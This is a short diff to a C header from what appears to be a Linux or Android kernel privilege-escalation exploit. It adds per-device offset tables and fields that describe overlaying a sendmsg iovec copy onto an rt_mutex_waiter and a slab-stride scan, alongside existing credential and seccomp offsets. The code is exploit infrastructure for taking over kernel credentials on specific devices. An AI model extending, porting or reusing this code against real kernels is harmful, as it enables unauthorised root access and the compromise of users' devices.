@@ -68,6 +68,15 @@ struct kernel_offsets {
   uint32_t task_real_cred, task_cred, task_comm, task_tasks, task_seccomp;
   uint32_t mm_owner;
   uint32_t waiter_compact;
+  /* 1 = the sendmsg iovstack (128-byte iovec copy) covers the WHOLE
+   * rt_mutex_waiter, so the iovs themselves carry task/lock/prio. Else the
+   * legacy layout uses iovstack for the low fields + the sockaddr for the
+   * high fields (sabrina). */
+  uint32_t iov_covers_waiter;
+  /* mm_cachep object stride = ALIGN(sizeof(mm_struct)+cpumask_size(), 64).
+   * 0 = use target.h default (1024). Drives the KernelSnitch scan stride,
+   * so it must match the running kernel's mm_cachep. */
+  uint32_t mm_struct_sz;
   uint64_t kimage_text_base;
 
   /* Per-kernel-version file_operations field offsets.
@@ -123,6 +132,8 @@ struct kernel_offsets {
 
 static const struct kernel_offsets known_offsets[] = {
 #include "sabrina/offsets.h"
+#include "onn/offsets.h"
+#include "coffey/offsets.h"
   { .uname_r = NULL }
 };
 
